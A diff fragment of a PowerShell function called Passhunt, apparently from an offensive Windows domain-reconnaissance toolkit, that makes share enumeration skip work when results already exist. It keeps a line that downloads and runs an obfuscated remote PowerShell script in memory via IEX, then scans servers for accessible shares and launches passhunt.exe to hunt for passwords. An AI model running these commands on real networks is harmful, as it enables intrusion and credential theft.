@@ -1837,14 +1837,20 @@ function Passhunt
                 Searchservers
             }
 
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewobfs.ps1')
-            Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
-            brainstorm -ComputerFile "$currentPath\DomainRecon\activeservers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
-             
-            $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
-            $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
-            $testShares > "$currentPath\DomainRecon\found_shares.txt"
-
+            if (!(Test-Path("$currentPath\DomainRecon\found_shares.txt")))
+            {
+                IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewobfs.ps1')
+                Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
+                brainstorm -ComputerFile "$currentPath\DomainRecon\activeservers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
+                 
+                $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
+                $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
+                $testShares > "$currentPath\DomainRecon\found_shares.txt"
+            }
+            else
+            {
+                $testShares = Get-Content -Path "$currentPath\DomainRecon\found_shares.txt"
+            }
             Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
 	    if (!(test-path $currentPath\passhunt.exe))
 	    {
